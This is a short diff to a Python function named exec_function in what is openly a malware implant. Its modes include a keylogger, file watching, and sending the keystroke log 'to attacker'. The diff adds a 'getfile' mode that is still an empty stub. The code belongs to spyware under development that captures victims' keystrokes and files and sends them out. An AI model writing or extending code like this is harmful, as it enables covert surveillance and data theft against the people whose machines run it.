@@ -86,8 +86,16 @@ def exec_function(mode, *args):
         if mode == "keylog":
             print("Activate: ", mode)
             is_running = True
+
             keylogger.start_keylogger()
         
+        elif mode == "getfile":
+            print("Activate: ", mode)
+            is_running = True
+
+            filename = args[0]
+            return
+
         elif mode == "watchfile":
             print("Activate: ", mode)
             is_running = True
@@ -118,6 +126,9 @@ def exec_function(mode, *args):
             # Stop keylogger, and send log to attacker
             keylogger.stop_keylogger()
             send_file(mode, "keylog.txt", 1000)
+
+        elif mode == "getfile":
+            return
 
         if mode == "watchfile":
             print("Stop: ", mode)
